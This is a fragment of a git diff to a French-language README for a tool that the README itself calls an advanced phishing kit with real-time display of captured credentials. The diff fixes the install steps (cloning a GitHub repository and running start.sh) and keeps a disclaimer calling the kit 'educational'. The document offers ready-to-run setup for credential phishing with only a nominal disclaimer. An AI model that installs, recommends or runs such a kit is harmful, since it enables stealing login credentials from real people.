@@ -11,7 +11,9 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
 1. **Mettre à jour les paquets** :
    ```bash
    
-   git clone https://github.com/Samsmis01/garena.gitcd garenabash start.sh
+   git clone https://github.com/Samsmis01/garena.git
+cd garena
+bash start.sh
 
   ⚠️ NB:CECI EST DANS LE CADRE ÉDUCATIF, EN CAS D'UTILISATION
   CONTRAIRE A L'ÉTHIQUE NOUS NE SOMMES PAS RESPONSABLE DE VOS
